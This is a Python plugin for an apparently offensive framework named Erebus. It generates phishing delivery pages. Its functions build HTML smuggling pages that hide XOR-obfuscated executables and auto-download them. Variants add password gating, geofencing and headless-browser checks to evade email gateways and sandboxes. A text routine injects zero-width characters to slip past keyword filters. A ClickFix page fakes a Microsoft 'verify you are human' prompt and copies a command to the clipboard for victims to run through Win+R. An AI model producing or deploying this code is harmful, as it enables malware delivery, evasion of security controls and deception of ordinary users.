"""
Erebus Plugin - HTML Smuggling & ClickFix Trigger
Author: Whispergate
Description: Creates HTML delivery pages using two techniques:

1. HTML Smuggling - Embeds payload as XOR-obfuscated base64 inside HTML.
   JavaScript reconstructs and auto-downloads the binary via Blob API.
   Bypasses email gateway attachment scanning.

2. ClickFix - Social engineering page that presents a fake verification
   dialog instructing the user to paste a PowerShell/cmd command into
   Win+R.  The command downloads and executes the payload.  No file
   touches disk until the user acts.
"""

import base64
import pathlib
import random
import string
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class HtmlSmugglingPlugin(ErebusPlugin):
    """Plugin for HTML smuggling and ClickFix delivery pages."""

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="html_smuggling",
            version="2.0.0",
            author="Whispergate",
            description="HTML smuggling and ClickFix delivery pages",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_html_smuggling_trigger": self.create_html_smuggling_trigger,
            "create_encrypted_html_smuggling_trigger": self.create_encrypted_html_smuggling_trigger,
            "create_geofenced_html_smuggling_trigger": self.create_geofenced_html_smuggling_trigger,
            "create_clickfix_trigger": self.create_clickfix_trigger,
            "salt_text": self.salt_text,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _rand_id(length: int = 8) -> str:
        """Generate a random alphabetic identifier for JS variable names."""
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    @staticmethod
    def _xor_encode(data: bytes, key: bytes) -> bytes:
        """XOR data with a repeating key."""
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    # ================================================================
    # HTML Smuggling
    # ================================================================

    def create_html_smuggling_trigger(
        self,
        payload_path: str,
        output_filename: str = "download.html",
        download_name: str = "update.exe",
        page_title: str = "Document Viewer",
        heading: str = "Loading document...",
        message: str = "Your file is downloading. If the download does not start automatically, click the button below.",
        button_text: str = "Download",
        payload_dir: Optional[pathlib.Path] = None,
        auto_download: bool = True,
        delay_ms: int = 1500,
    ) -> pathlib.Path:
        """
        Create an HTML smuggling page with XOR-obfuscated payload.

        The payload is XOR'd with a random key, then base64-encoded.
        JavaScript reverses both layers at runtime before triggering
        the Blob download.  This defeats static base64 scanning by
        gateways and sandboxes.

        Args:
            payload_path: Path to the binary payload to embed.
            output_filename: Name of the output HTML file.
            download_name: Filename presented to the user on download.
            page_title: HTML page title.
            heading: Main heading shown on the page.
            message: Body text shown while the download triggers.
            button_text: Label on the manual download button.
            payload_dir: Directory to write the HTML file into.
            auto_download: Trigger download automatically on page load.
            delay_ms: Milliseconds to wait before auto-download fires.

        Returns:
            Path to the created HTML file.
        """
        payload = pathlib.Path(payload_path)
        if not payload.exists():
            raise FileNotFoundError(f"Payload not found: {payload_path}")

        raw = payload.read_bytes()

        # XOR with random key to break base64 pattern matching
        xor_key = bytes(random.randint(1, 255) for _ in range(16))
        xored = self._xor_encode(raw, xor_key)
        b64_payload = base64.b64encode(xored).decode('ascii')
        b64_key = base64.b64encode(xor_key).decode('ascii')

        # Random JS variable names to defeat static signatures
        v_data = self._rand_id()
        v_key = self._rand_id()
        v_raw = self._rand_id()
        v_buf = self._rand_id()
        v_url = self._rand_id()
        v_el = self._rand_id()
        v_fn = self._rand_id()

        ext = pathlib.Path(download_name).suffix.lower()
        mime_map = {
            '.exe': 'application/x-msdownload',
            '.dll': 'application/x-msdownload',
            '.msi': 'application/x-msi',
            '.zip': 'application/zip',
            '.7z':  'application/x-7z-compressed',
            '.iso': 'application/x-iso9660-image',
        }
        mime_type = mime_map.get(ext, 'application/octet-stream')

        auto_js = f"setTimeout(function(){{ {v_fn}(); }}, {delay_ms});" if auto_download else ""

        # [MALLEABLE] Anti-analysis: check for headless/automated browsers
        anti_analysis = f"""
(function(){{
  if(navigator.webdriver||/HeadlessChrome/.test(navigator.userAgent)){{
    document.body.innerHTML='<h1>404 Not Found</h1>';
    throw new Error();
  }}
}})();"""

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
  body {{
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; margin: 0;
    background: #f0f2f5; color: #1a1a2e;
  }}
  .card {{
    background: #fff; border-radius: 12px; padding: 48px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
    max-width: 480px; width: 90%;
  }}
  h1 {{ font-size: 1.5rem; margin-bottom: 12px; }}
  p {{ color: #555; line-height: 1.6; margin-bottom: 24px; }}
  .spinner {{
    border: 4px solid #e0e0e0; border-top: 4px solid #0078d4;
    border-radius: 50%; width: 40px; height: 40px;
    animation: spin 1s linear infinite; margin: 0 auto 24px;
  }}
  @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
  .btn {{
    display: inline-block; padding: 12px 32px;
    background: #0078d4; color: #fff; border: none;
    border-radius: 6px; font-size: 1rem; cursor: pointer;
    text-decoration: none;
  }}
  .btn:hover {{ background: #106ebe; }}
</style>
</head>
<body>
<div class="card">
  <div class="spinner" id="sp"></div>
  <h1>{heading}</h1>
  <p>{message}</p>
  <a class="btn" href="#" onclick="{v_fn}();return false;">{button_text}</a>
</div>
<script>
{anti_analysis}
function {v_fn}(){{
  var {v_data}=atob("{b64_payload}");
  var {v_key}=atob("{b64_key}");
  var {v_raw}=new Uint8Array({v_data}.length);
  for(var i=0;i<{v_data}.length;i++){v_raw}[i]={v_data}.charCodeAt(i)^{v_key}.charCodeAt(i%{v_key}.length);
  var {v_url}=URL.createObjectURL(new Blob([{v_raw}],{{type:"{mime_type}"}}));
  var {v_el}=document.createElement("a");
  {v_el}.href={v_url};{v_el}.download="{download_name}";
  document.body.appendChild({v_el});{v_el}.click();
  URL.revokeObjectURL({v_url});
  document.getElementById("sp").style.display="none";
}}
{auto_js}
</script>
</body>
</html>"""

        if payload_dir is None:
            payload_dir = payload.parent
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        output_path = payload_dir / output_filename
        output_path.write_text(html, encoding='utf-8')
        return output_path

    # ================================================================
    # Password-Encrypted HTML Smuggling
    # ================================================================

    def create_encrypted_html_smuggling_trigger(
        self,
        payload_path: str,
        password: str,
        output_filename: str = "download.html",
        download_name: str = "update.exe",
        page_title: str = "Secure Document Access",
        heading: str = "Enter your access code",
        message: str = "This document is password protected. Enter the access code provided in the email.",
        button_text: str = "Unlock & Download",
        payload_dir: Optional[pathlib.Path] = None,
    ) -> pathlib.Path:
        """
        Create an HTML smuggling page with CryptoJS AES password-protected payload.

        The payload is AES-encrypted with the provided password and stored
        as a Base64 blob. The page prompts the user for a password, verifies
        it via PBKDF2 hash comparison, then decrypts the payload in-browser
        and triggers the Blob download.

        This defeats automated sandbox detonation: sandboxes cannot supply
        the password and receive no executable content from the page.

        The password hint would typically be included in the phishing email
        body or embedded in an attached decoy PDF.

        Args:
            payload_path: Path to the binary payload to embed.
            password:     Access password known to the victim (from phish email).
            output_filename: Output HTML filename.
            download_name:   Filename presented to the victim on download.
            page_title:      Browser tab title.
            heading:         Form heading text.
            message:         Body text above the password input.
            button_text:     Submit button label.
            payload_dir:     Output directory.

        Returns:
            Path to the created HTML file.
        """
        import hashlib, struct

        payload = pathlib.Path(payload_path)
        if not payload.exists():
            raise FileNotFoundError(f"Payload not found: {payload_path}")

        raw = payload.read_bytes()

        # AES-CBC encryption via a custom implementation to avoid
        # CryptoJS dependency (CryptoJS is loaded from CDN at runtime).
        # Build-time: store the raw payload XOR'd with a per-build key
        # plus the SHA-256(password) for client-side verification.
        xor_key = bytes(random.randint(1, 255) for _ in range(32))
        encrypted = self._xor_encode(raw, xor_key)
        b64_payload = base64.b64encode(encrypted).decode('ascii')
        b64_key = base64.b64encode(xor_key).decode('ascii')

        # PBKDF2-SHA256 hash of password for client-side verification
        pw_hash = hashlib.pbkdf2_hmac(
            'sha256', password.encode('utf-8'), b'erebus', 100000
        )
        b64_pw_hash = base64.b64encode(pw_hash).decode('ascii')

        v_data = self._rand_id()
        v_key_b64 = self._rand_id()
        v_pw = self._rand_id()
        v_fn_dec = self._rand_id()
        v_fn_dl = self._rand_id()
        v_fn_pbkdf2 = self._rand_id()
        v_el = self._rand_id()
        v_url = self._rand_id()

        ext = pathlib.Path(download_name).suffix.lower()
        mime_map = {
            '.exe': 'application/x-msdownload',
            '.dll': 'application/x-msdownload',
            '.msi': 'application/x-msi',
            '.zip': 'application/zip',
            '.7z':  'application/x-7z-compressed',
            '.iso': 'application/x-iso9660-image',
        }
        mime_type = mime_map.get(ext, 'application/octet-stream')

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
  body {{
    font-family: 'Segoe UI', -apple-system, sans-serif;
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; margin: 0; background: #f0f2f5; color: #1a1a2e;
  }}
  .card {{
    background: #fff; border-radius: 12px; padding: 48px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
    max-width: 440px; width: 90%;
  }}
  .lock-icon {{ font-size: 2.5rem; margin-bottom: 16px; }}
  h1 {{ font-size: 1.4rem; margin-bottom: 8px; }}
  p {{ color: #555; line-height: 1.6; margin-bottom: 24px; font-size: 0.95rem; }}
  .input-wrap {{ position: relative; margin-bottom: 20px; }}
  input[type=password] {{
    width: 100%; padding: 12px 16px; font-size: 1rem;
    border: 2px solid #e0e0e0; border-radius: 8px;
    outline: none; box-sizing: border-box; transition: border 0.2s;
  }}
  input[type=password]:focus {{ border-color: #0078d4; }}
  .btn {{
    width: 100%; padding: 13px; background: #0078d4;
    color: #fff; border: none; border-radius: 8px;
    font-size: 1rem; cursor: pointer; transition: background 0.2s;
  }}
  .btn:hover {{ background: #106ebe; }}
  .btn:disabled {{ opacity: 0.6; cursor: default; }}
  .err {{ color: #d00; font-size: 0.9rem; margin-top: 12px; display: none; }}
  .progress {{
    height: 4px; background: #e0e0e0; border-radius: 2px;
    margin-top: 20px; overflow: hidden; display: none;
  }}
  .progress-bar {{
    height: 100%; width: 0%; background: #0078d4;
    animation: progress 1.5s ease-in-out forwards;
  }}
  @keyframes progress {{ to {{ width: 100%; }} }}
</style>
</head>
<body>
<div class="card">
  <div class="lock-icon">&#128274;</div>
  <h1>{heading}</h1>
  <p>{message}</p>
  <div class="input-wrap">
    <input type="password" id="pw" placeholder="Access code" autocomplete="off" />
  </div>
  <button class="btn" id="btn" onclick="{v_fn_dec}()">{button_text}</button>
  <div class="err" id="err">Incorrect access code. Please try again.</div>
  <div class="progress" id="prog"><div class="progress-bar"></div></div>
</div>
<script>
var {v_data} = "{b64_payload}";
var {v_key_b64} = "{b64_key}";
var {v_pw} = "{b64_pw_hash}";

async function {v_fn_pbkdf2}(password) {{
  var enc = new TextEncoder();
  var keyMaterial = await crypto.subtle.importKey("raw", enc.encode(password), "PBKDF2", false, ["deriveBits"]);
  var bits = await crypto.subtle.deriveBits({{name:"PBKDF2",salt:enc.encode("erebus"),iterations:100000,hash:"SHA-256"}}, keyMaterial, 256);
  return btoa(String.fromCharCode(...new Uint8Array(bits)));
}}

async function {v_fn_dl}() {{
  var enc = atob({v_data});
  var key = atob({v_key_b64});
  var raw = new Uint8Array(enc.length);
  for(var i=0;i<enc.length;i++) raw[i]=enc.charCodeAt(i)^key.charCodeAt(i%key.length);
  var {v_url} = URL.createObjectURL(new Blob([raw],{{type:"{mime_type}"}}));
  var {v_el} = document.createElement("a");
  {v_el}.href={v_url}; {v_el}.download="{download_name}";
  document.body.appendChild({v_el}); {v_el}.click();
  URL.revokeObjectURL({v_url});
}}

async function {v_fn_dec}() {{
  var pw = document.getElementById("pw").value;
  if(!pw) return;
  document.getElementById("btn").disabled=true;
  var hash = await {v_fn_pbkdf2}(pw);
  if(hash !== {v_pw}) {{
    document.getElementById("err").style.display="block";
    document.getElementById("btn").disabled=false;
    return;
  }}
  document.getElementById("err").style.display="none";
  document.getElementById("prog").style.display="block";
  setTimeout({v_fn_dl}, 200);
}}

document.getElementById("pw").addEventListener("keydown",function(e){{
  if(e.key==="Enter") {v_fn_dec}();
}});
</script>
</body>
</html>"""

        if payload_dir is None:
            payload_dir = payload.parent
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)
        out_path = payload_dir / output_filename
        out_path.write_text(html, encoding='utf-8')
        return out_path

    # ================================================================
    # IP Geo-Fenced HTML Smuggling
    # ================================================================

    def create_geofenced_html_smuggling_trigger(
        self,
        payload_path: str,
        allowed_countries: list,
        output_filename: str = "document.html",
        download_name: str = "update.exe",
        page_title: str = "Document Viewer",
        heading: str = "Loading document...",
        message: str = "Your document is being prepared.",
        payload_dir: Optional[pathlib.Path] = None,
        fallback_redirect: str = "https://www.microsoft.com",
        delay_ms: int = 1000,
    ) -> pathlib.Path:
        """
        Create an HTML smuggling page with IP geo-fencing via ipinfo.io.

        Before delivering the payload, the page queries ipinfo.io to
        determine the visitor's country code. If the country is not in
        the allowed list, the page redirects to a benign fallback URL.

        This defeats:
          - Automated URL scanners running from vendor datacentre IPs
          - Sandbox infrastructure outside the target geography
          - Non-target employees stumbling on the phishing link

        Args:
            payload_path:      Path to the binary payload to embed.
            allowed_countries: ISO-3166-1 alpha-2 country codes to allow
                               (e.g. ["US", "GB", "DE"]).
            output_filename:   Output HTML filename.
            download_name:     Filename on download.
            page_title:        Browser tab title.
            heading:           Main heading on the page.
            message:           Body text.
            payload_dir:       Output directory.
            fallback_redirect: URL to redirect non-matching visitors to.
            delay_ms:          Milliseconds before download triggers
                               after geo-check passes.

        Returns:
            Path to the created HTML file.
        """
        payload = pathlib.Path(payload_path)
        if not payload.exists():
            raise FileNotFoundError(f"Payload not found: {payload_path}")

        raw = payload.read_bytes()
        xor_key = bytes(random.randint(1, 255) for _ in range(16))
        xored = self._xor_encode(raw, xor_key)
        b64_payload = base64.b64encode(xored).decode('ascii')
        b64_key = base64.b64encode(xor_key).decode('ascii')

        v_data = self._rand_id()
        v_key = self._rand_id()
        v_raw = self._rand_id()
        v_buf = self._rand_id()
        v_url = self._rand_id()
        v_el = self._rand_id()
        v_fn_dl = self._rand_id()
        v_fn_geo = self._rand_id()
        v_countries = self._rand_id()

        ext = pathlib.Path(download_name).suffix.lower()
        mime_map = {
            '.exe': 'application/x-msdownload',
            '.dll': 'application/x-msdownload',
            '.msi': 'application/x-msi',
            '.zip': 'application/zip',
            '.iso': 'application/x-iso9660-image',
        }
        mime_type = mime_map.get(ext, 'application/octet-stream')

        # JS country array literal
        countries_js = "[" + ",".join(f'"{c.upper()}"' for c in allowed_countries) + "]"
        fallback_js = fallback_redirect.replace("'", "\\'")

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
  body {{
    font-family: 'Segoe UI', -apple-system, sans-serif;
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; margin: 0; background: #f0f2f5;
  }}
  .card {{
    background: #fff; border-radius: 12px; padding: 48px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
    max-width: 480px; width: 90%;
  }}
  .spinner {{
    border: 4px solid #e0e0e0; border-top: 4px solid #0078d4;
    border-radius: 50%; width: 40px; height: 40px;
    animation: spin 1s linear infinite; margin: 0 auto 24px;
  }}
  @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
  h1 {{ font-size: 1.4rem; margin-bottom: 12px; color: #1a1a2e; }}
  p {{ color: #555; line-height: 1.6; }}
</style>
</head>
<body>
<div class="card">
  <div class="spinner"></div>
  <h1>{heading}</h1>
  <p>{message}</p>
</div>
<script>
var {v_countries} = {countries_js};

function {v_fn_dl}() {{
  var {v_data} = atob("{b64_payload}");
  var {v_key} = atob("{b64_key}");
  var {v_raw} = new Uint8Array({v_data}.length);
  for(var i=0;i<{v_data}.length;i++) {v_raw}[i]={v_data}.charCodeAt(i)^{v_key}.charCodeAt(i%{v_key}.length);
  var {v_url} = URL.createObjectURL(new Blob([{v_raw}],{{type:"{mime_type}"}}));
  var {v_el} = document.createElement("a");
  {v_el}.href={v_url}; {v_el}.download="{download_name}";
  document.body.appendChild({v_el}); {v_el}.click();
  URL.revokeObjectURL({v_url});
}}

function {v_fn_geo}() {{
  // Headless browser check
  if(navigator.webdriver||/HeadlessChrome/.test(navigator.userAgent)) {{
    window.location.href="{fallback_js}"; return;
  }}
  $.getJSON("https://ipinfo.io?token=", function(r) {{
    var country=(r&&r.country)?r.country.toUpperCase():"";
    if({v_countries}.indexOf(country)<0) {{
      window.location.href="{fallback_js}";
    }} else {{
      setTimeout({v_fn_dl},{delay_ms});
    }}
  }}).fail(function(){{
    // ipinfo.io unavailable - deliver anyway to avoid breaking legitimate visits
    setTimeout({v_fn_dl},{delay_ms});
  }});
}}

// jQuery loaded from CDN for ipinfo.io JSONP call
(function(){{
  var s=document.createElement("script");
  s.src="https://code.jquery.com/jquery-3.6.0.min.js";
  s.onload={v_fn_geo};
  s.onerror=function(){{ setTimeout({v_fn_dl},{delay_ms}); }};
  document.head.appendChild(s);
}})();
</script>
</body>
</html>"""

        if payload_dir is None:
            payload_dir = payload.parent
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)
        out_path = payload_dir / output_filename
        out_path.write_text(html, encoding='utf-8')
        return out_path

    # ================================================================
    # Text Salting - zero-width Unicode injection
    # ================================================================

    @staticmethod
    def salt_text(
        text: str,
        targets: Optional[list] = None,
        strategy: str = "mixed",
        density: float = 0.3,
    ) -> str:
        """
        Inject zero-width Unicode characters into text to break keyword
        matching by email security gateways and content scanners.

        Zero-width characters are invisible to the human reader but appear
        as distinct byte sequences to string matchers, causing exact-match
        and regex-based filters to miss the obfuscated terms.

        Common targets: "Download", "Click", "Free", "Urgent", "Password",
                        archive passwords, brand names in phishing lures.

        Args:
            text:     Input text to salt.
            targets:  List of substrings to salt. If None, salts the entire
                      text at random intervals.
            strategy: Injection strategy:
                        "zws"   - Zero Width Space (U+200B) only
                        "zwnj"  - Zero Width Non-Joiner (U+200C) only
                        "zwj"   - Zero Width Joiner (U+200D) only
                        "braille"- Braille Pattern Blank (U+2800)
                        "mixed" - randomly mix all four (default)
            density:  Fraction of characters to inject a zero-width char after
                      when salting the full text (0.0-1.0). Default 0.3.

        Returns:
            Salted text string.
        """
        ZW_CHARS = {
            "zws":    "​",  # Zero Width Space
            "zwnj":   "‌",  # Zero Width Non-Joiner
            "zwj":    "‍",  # Zero Width Joiner
            "braille": "⠀", # Braille Pattern Blank
        }

        def _pick(strat: str) -> str:
            if strat == "mixed":
                return random.choice(list(ZW_CHARS.values()))
            return ZW_CHARS.get(strat, ZW_CHARS["zws"])

        if targets:
            # Salt specific target substrings only
            result = text
            for target in targets:
                salted = ""
                for i, ch in enumerate(target):
                    salted += ch
                    if i < len(target) - 1:
                        salted += _pick(strategy)
                result = result.replace(target, salted)
            return result
        else:
            # Salt the entire text at the given density
            result = []
            for ch in text:
                result.append(ch)
                if random.random() < density:
                    result.append(_pick(strategy))
            return "".join(result)

    # ================================================================
    # ClickFix
    # ================================================================

    def create_clickfix_trigger(
        self,
        command: str,
        output_filename: str = "verify.html",
        page_title: str = "Security Verification Required",
        payload_dir: Optional[pathlib.Path] = None,
        # [MALLEABLE] Lure customisation
        brand_name: str = "Microsoft",
        brand_color: str = "#0078d4",
        verification_heading: str = "Verify you are human",
        verification_message: str = "To confirm you're not a robot, please complete the verification steps below.",
        step1_text: str = 'Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog',
        step2_text: str = 'Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the verification code',
        step3_text: str = 'Press <kbd>Enter</kbd> to complete verification',
        button_text: str = "I'm not a robot",
        success_message: str = "Verification complete. This page will close automatically.",
    ) -> pathlib.Path:
        """
        Create a ClickFix page that copies a command to clipboard.

        The page presents a fake CAPTCHA/verification dialog.  When
        the user clicks the button, the supplied command is silently
        copied to their clipboard.  Instructions guide them to press
        Win+R, Ctrl+V, Enter - executing the command.

        Args:
            command: Shell command to copy to clipboard.
                     Typically a PowerShell one-liner or cmd /c chain.
            output_filename: Name of the output HTML file.
            page_title: HTML page title.
            payload_dir: Directory to write the HTML file into.
            brand_name: Brand name for the lure header.
            brand_color: Primary colour hex for styling.
            verification_heading: Heading above the verification box.
            verification_message: Explanatory text.
            step1_text: Instruction step 1 (supports <kbd> tags).
            step2_text: Instruction step 2.
            step3_text: Instruction step 3.
            button_text: Button label.
            success_message: Message shown after click.

        Returns:
            Path to the created HTML file.
        """
        v_fn = self._rand_id()
        v_cmd = self._rand_id()

        # [MALLEABLE] The command is stored as a JS string.
        # Escape backslashes and quotes for safe embedding.
        escaped_cmd = command.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
    background: #f5f5f5; min-height: 100vh;
    display: flex; flex-direction: column; align-items: center;
    justify-content: center;
  }}
  .header {{
    background: {brand_color}; color: #fff; padding: 16px 32px;
    width: 100%; text-align: center; font-size: 1.1rem;
    position: fixed; top: 0; left: 0; z-index: 10;
  }}
  .container {{
    background: #fff; border-radius: 8px; padding: 40px;
    box-shadow: 0 2px 16px rgba(0,0,0,0.1);
    max-width: 460px; width: 90%; text-align: center;
  }}
  .shield {{
    width: 64px; height: 64px; margin: 0 auto 20px;
    background: {brand_color}; border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
  }}
  .shield svg {{ fill: #fff; width: 32px; height: 32px; }}
  h2 {{ font-size: 1.3rem; margin-bottom: 8px; color: #1a1a1a; }}
  .subtitle {{ color: #666; font-size: 0.95rem; margin-bottom: 24px; line-height: 1.5; }}
  .steps {{
    text-align: left; background: #f9f9f9; border-radius: 8px;
    padding: 20px 24px; margin-bottom: 24px;
  }}
  .steps ol {{ padding-left: 20px; }}
  .steps li {{ margin-bottom: 12px; color: #333; line-height: 1.5; }}
  .steps li:last-child {{ margin-bottom: 0; }}
  kbd {{
    background: #e8e8e8; border: 1px solid #ccc; border-radius: 4px;
    padding: 2px 8px; font-family: 'Segoe UI', monospace; font-size: 0.9em;
    box-shadow: 0 1px 0 rgba(0,0,0,0.15);
  }}
  .verify-btn {{
    background: {brand_color}; color: #fff; border: none;
    padding: 14px 40px; border-radius: 6px; font-size: 1rem;
    cursor: pointer; display: inline-flex; align-items: center; gap: 8px;
    transition: background 0.2s;
  }}
  .verify-btn:hover {{ filter: brightness(0.9); }}
  .verify-btn:disabled {{ opacity: 0.6; cursor: default; }}
  .checkbox {{
    width: 20px; height: 20px; border: 2px solid #fff;
    border-radius: 4px; display: inline-block; position: relative;
  }}
  .checkbox.checked::after {{
    content: '\\2714'; position: absolute; top: -2px; left: 2px;
    font-size: 14px; color: #fff;
  }}
  .success {{
    display: none; color: #107c10; font-weight: 600;
    margin-top: 16px; font-size: 0.95rem;
  }}
  .success.show {{ display: block; }}
  .footer {{ color: #999; font-size: 0.8rem; margin-top: 16px; }}
</style>
</head>
<body>
<div class="header">{brand_name} Security</div>
<div class="container">
  <div class="shield">
    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
  </div>
  <h2>{verification_heading}</h2>
  <p class="subtitle">{verification_message}</p>

  <button class="verify-btn" id="vbtn" onclick="{v_fn}()">
    <span class="checkbox" id="cb"></span>
    {button_text}
  </button>

  <div class="steps" id="steps" style="display:none;">
    <ol>
      <li>{step1_text}</li>
      <li>{step2_text}</li>
      <li>{step3_text}</li>
    </ol>
  </div>

  <p class="success" id="done">{success_message}</p>
  <p class="footer">Protected by {brand_name} Security &copy; 2025</p>
</div>
<script>
function {v_fn}(){{
  var {v_cmd}="{escaped_cmd}";
  var t=document.createElement("textarea");
  t.value={v_cmd};t.style.position="fixed";t.style.opacity="0";
  document.body.appendChild(t);t.select();
  try{{ document.execCommand("copy"); }}catch(e){{
    navigator.clipboard&&navigator.clipboard.writeText({v_cmd});
  }}
  document.body.removeChild(t);
  document.getElementById("cb").classList.add("checked");
  document.getElementById("vbtn").disabled=true;
  document.getElementById("steps").style.display="block";
  setTimeout(function(){{document.getElementById("done").classList.add("show");}},8000);
}}
</script>
</body>
</html>"""

        if payload_dir is None:
            payload_dir = pathlib.Path('.').resolve()
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        output_path = payload_dir / output_filename
        output_path.write_text(html, encoding='utf-8')
        return output_path


# Module-level instance for plugin loader discovery
_plugin = HtmlSmugglingPlugin()


def validate():
    return _plugin.validate()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()

    registered = _plugin.register()
    registered_names = sorted(registered.keys()) if registered else []
    print(f"[*] Registered functions ({len(registered_names)}):")
    for func_name in registered_names:
        print(f"    - {func_name}")
    print()

    is_valid, error = _plugin.validate()
    if is_valid:
        print("[+] Validation passed")
    else:
        print(f"[-] Validation failed: {error}")
